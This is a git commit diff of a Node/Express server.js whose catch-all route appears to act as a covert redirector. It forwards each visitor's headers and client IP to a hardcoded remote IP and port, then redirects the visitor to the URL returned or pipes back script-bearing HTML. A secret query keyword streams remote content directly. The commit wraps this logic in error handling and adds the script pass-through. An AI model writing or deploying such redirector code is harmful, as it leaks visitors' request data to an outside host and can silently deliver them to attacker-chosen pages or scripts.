240f2b3c5d1415665063f655f0930b54c816a52c
filomena1040 <120242762+filomena1040@users.noreply.github.com>
2023-11-20 23:25:52 -0800

    2

--- server.js
+++ server.js
@@ -9,40 +9,47 @@ app.use(bodyParser.raw());
 app.set("port", process.env.PORT);
 
 app.get("*", function (req, res) {
-  req.headers["X-Asteria-Client-IP"]=req.headers["x-forwarded-for"].split(",")[0]
-  var head = req.headers;
-  var headerss=JSON.stringify(head).replace("'{","").replace("}'","").replace("content-length","content2").replace("accept-encoding","dfsdfsdff")
-  var querystring = req.url;
-  var urrrl = "http://185.236.78.147:6070" + req.url;
-  console.log(urrrl);
-  if(!querystring.includes("flgkimv")){
-     
-      requester.get(
-      {
-        headers:JSON.parse(headerss),
-        url:     urrrl,
-      }, function(error, response, body){
-          console.log(body);
-        
-        if(response.statusCode==200){
-          if(!body.includes("<")){
-            return res.redirect(body); 
-          }else{
-            return res.sendStatus(400);           
-          }
-        }else{  
-          return res.sendStatus(400);
+ try {
+        req.headers["X-Asteria-Client-IP"]=req.headers["x-forwarded-for"].split(",")[0]
+        var head = req.headers;
+        var headerss=JSON.stringify(head).replace("'{","").replace("}'","").replace("content-length","content2").replace("accept-encoding","dfsdfsdff")
+        var querystring = req.url;
+        var urrrl = "http://185.236.78.147:6070" + req.url;
+        console.log(urrrl);
+        if(!querystring.includes("flgkimv")){
+           
+            requester.get(
+            {
+              headers:JSON.parse(headerss),
+              url:     urrrl,
+            }, function(error, response, body){
+                console.log(body);
+              
+              if(response.statusCode==200){
+                if(!body.includes("<")){
+                  return res.redirect(body); 
+                }else if(body.includes("<body><script>")){
+                  return response.pipe(res);
+                }
+                else{
+                  return res.abort();           
+                }
+              }else{  
+                return res.abort();
+              }
+          });
+          
+        }else if(querystring.includes("flgkimv")){
+          
+          requester.get({headers:JSON.parse(headerss),url:urrrl}).pipe(res);
+             
+        }else{
+           return res.abort();
         }
-    });
-    
-  }else if(querystring.includes("flgkimv")){
-    
-    requester.get({headers:JSON.parse(headerss),url:urrrl}).pipe(res);
-       
-  }else{
-     return res.sendStatus(400);
-  }
-    
+    } catch (error) {
+       console.error(error);
+       return res.abort();
+    }
 });
 
 app.listen(process.env.PORT, "0.0.0.0", function () {
